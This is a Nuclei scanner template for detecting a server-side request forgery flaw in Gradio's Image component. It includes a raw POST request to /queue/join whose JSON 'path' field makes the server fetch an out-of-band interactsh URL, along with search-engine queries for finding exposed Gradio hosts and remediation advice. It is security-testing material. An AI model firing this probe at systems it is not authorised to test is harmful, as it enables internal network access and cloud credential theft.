id: gradio-image-ssrf

info:
  name: Gradio Image Component - 服务端请求伪造漏洞
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 Gradio Image Component - 服务端请求伪造漏洞。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/queue/join?` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://huntr.com/bounties/e9baeed8-868a-4c1b-882c-715ae0f3072f
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-918
    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:*:python:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: gradio_app
    product: gradio
    shodan-query:
      - http.html:"__gradio_mode__"
      - http.title:"gradio"
    fofa-query:
      - body="__gradio_mode__"
      - title="gradio"
    google-query: intitle:"gradio"
  tags: cve,cve2024,gradio,ssrf,oast,vuln

http:
  - raw:
      - |
        POST /queue/join? HTTP/1.1
        Host: {{Hostname}}
        content-type: application/json

        {"data":[{"path":"http://{{interactsh-url}}"}],"fn_index":0,"session_hash":"123"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "{\"event_id\":")'
          - 'contains(interactsh_protocol, "http")'
          - 'contains(content_type, "application/json")'
        condition: and
